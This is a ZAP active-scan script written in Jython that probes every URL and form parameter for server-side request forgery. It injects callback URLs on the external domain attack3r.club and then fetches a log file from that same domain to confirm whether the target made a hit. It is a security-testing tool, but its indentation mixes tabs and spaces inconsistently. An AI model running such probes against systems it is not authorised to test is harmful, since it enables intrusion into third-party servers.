"""
The scanNode function will typically be called once for every page 
The scan function will typically be called for every parameter in every URL and Form for every page 

Note that new active scripts will initially be disabled
Right click the script in the Scripts tree and select "enable"  
"""
import org.apache.http.HttpResponse
import org.apache.http.client.HttpClient
import org.apache.http.impl.client.DefaultHttpClient
import org.apache.http.client.methods.HttpGet
import org.apache.http.util.EntityUtils
import time
import random


def checkDnsHit(prefix_payload):
	client =  org.apache.http.impl.client.DefaultHttpClient()
	request = org.apache.http.client.methods.HttpGet("http://attack3r.club/tcpdumpron.txt")
	response = client.execute(request);
	
	responseString = org.apache.http.util.EntityUtils.toString(response.getEntity(), "UTF-8");
	body = str(responseString)
	if prefix_payload in body:
		return True
	else:
 		return False


payloads = ['http://ssrfpoc.obb.attack3r.club', 'https://ssrfpoc.obb.attack3r.club', 'ssrfpoc.obb.attack3r.club']
positive_responses = ['Exception', 'exception']

def scanNode(sas, msg):
  # Debugging can be done using print like this
  print('scan called for url=' + msg.getRequestHeader().getURI().toString());

  # Copy requests before reusing them
  msg = msg.cloneRequest();

  # sendAndReceive(msg, followRedirect, handleAntiCSRFtoken)
  sas.sendAndReceive(msg, False, False);

  # Test the responses and raise alerts as below


def scan(sas, msg, param, value):
  # Debugging can be done using print like this
  print('scan called for url=' + msg.getRequestHeader().getURI().toString() + 
    ' param=' + param + ' value=' + value);
  for p in payloads:
	payload = p.replace("ssrfpoc", "ssrfpoc" + str(random.randint(1000, 99999)))
  	# Copy requests before reusing them
  	msg_clone = msg.cloneRequest();
	
  	# setParam (message, parameterName, newValue)
  	sas.setParam(msg_clone, param, payload);

  	# sendAndReceive(msg, followRedirect, handleAntiCSRFtoken)
	try:
  		sas.sendAndReceive(msg_clone, False, False);
		res_body_str = msg_clone.getResponseBody().toString()
  		# Test the response here, and make other requests as required
		time.sleep(1)
  		if checkDnsHit(payload.upper()):
  		# Change to a test which detects the vulnerability
	    	# raiseAlert(risk, int reliability, String name, String description, String uri, 
	   	#		String param, String attack, String otherInfo, String solution, String evidence, 
	    	#		int cweId, int wascId, HttpMessage msg)
	    	# risk: 0: info, 1: low, 2: medium, 3: high
	   	# reliability: 0: falsePassitive, 1: suspicious, 2: warning
    			sas.raiseAlert(3, 2, 'Server Side Request Forgery', 'SSRF Detected', msg_clone.getRequestHeader().getURI().toString(), param, payload, 'Any other info', 'The solution ', '' , 0, 0, msg_clone);
	except:
		print('Error sending request')